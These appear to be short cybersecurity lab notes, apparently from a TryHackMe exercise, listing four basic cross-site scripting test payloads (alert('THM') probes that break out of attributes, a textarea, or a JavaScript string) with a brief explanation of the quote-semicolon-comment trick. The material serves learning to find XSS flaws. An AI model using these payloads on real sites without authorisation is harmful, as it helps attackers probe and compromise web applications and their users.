```javascript
<script>alert('THM');</script> // Checking for XSS Vulnerability
```

```javascript
"><script>alert('THM');</script> // Closing a tag before injecting payload
```

```javascript
</textarea><script>alert('THM');</script> // Closing a tag before injecting payload
```
---
```javascript
';alert('THM');//

```

**NOTE**

The `'` closes the field specifying the name, then `;` signifies the end of the current command, and the `//` at the end makes anything after it a comment rather than executable code.
